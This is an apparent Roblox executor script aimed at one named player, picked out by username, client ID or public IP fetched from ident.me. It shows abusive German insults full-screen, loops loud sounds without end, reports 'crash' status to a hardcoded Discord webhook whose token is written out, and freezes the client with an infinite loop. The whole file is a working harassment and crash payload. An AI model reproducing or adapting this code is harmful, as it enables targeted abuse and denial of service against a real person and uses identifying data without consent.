local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")
local GetIp = game:HttpGet("https://v4.ident.me/")
if game.Players.LocalPlayer.Name == "scopezfaded" or tostring(RbxAnalyticsService:GetClientId()) == "0173D636-2795-4B93-8B25-D09FB1844A12" or tostring(GetIp) == "31.10.145.77" then
-- Services
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

-- GUI Setup
local trollGui = Instance.new("ScreenGui", CoreGui)
trollGui.Name = "TrollGui"

local label = Instance.new("TextLabel", trollGui)
label.Size = UDim2.new(1, 0, 1, 0)
label.Position = UDim2.new(0, 0, 0, 0)
label.Text = "LECK MEINE EIER SCOPEZ \n DU KLEINER HURENSOHN 😂🤣"
label.TextColor3 = Color3.new(1, 0, 0)
label.TextScaled = true
label.BackgroundColor3 = Color3.new(1, 1, 1)
label.BackgroundTransparency = 0

-- Flash & Color Cycle
local colors = {
    Color3.new(1, 0, 0),
    Color3.new(0, 1, 0),
    Color3.new(0, 0, 1),
    Color3.new(1, 1, 0),
    Color3.new(0, 1, 1),
    Color3.new(1, 0, 1),
}

-- Sound Loop
local soundIds = {
    "rbxassetid://2661731024",
    "rbxassetid://9066167010",
    "rbxassetid://8426701399",
}

spawn(function()
    while wait() do
for _, id in ipairs(soundIds) do
    local sound = Instance.new("Sound", SoundService)
    sound.SoundId = id
    sound.Volume = 100
    sound:Play()
end
end
end)

-- Flash + Color loop
task.spawn(function()
    local startTime = tick()
    while tick() - startTime < 4 do
        label.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
        label.TextColor3 = colors[math.random(1, #colors)]
        task.wait(0.05)
    end
end)
wait(4)
    local function createWebhookData()

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {

            {
              title = "✅ Crash Status",
              description = "Crashing...",
              color = tonumber("0xfff200") -- Green color for success
                }

            }
        }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1365029188045635704/1oDKWGABAzn2__R-exYbxpqAweGyVrADirDOiJKhRlxx7WB3Ot8JHo_dupYS8MpMop2_"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)

spawn(function()
while true do end
end)

local function createWebhookData()

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {

            {
    title = "✅ Crash Status",
    description = "Crash Success",
    color = tonumber("0x2ecc71") -- Green color for success
}

            }
        }
    
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1365029188045635704/1oDKWGABAzn2__R-exYbxpqAweGyVrADirDOiJKhRlxx7WB3Ot8JHo_dupYS8MpMop2_"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)

end
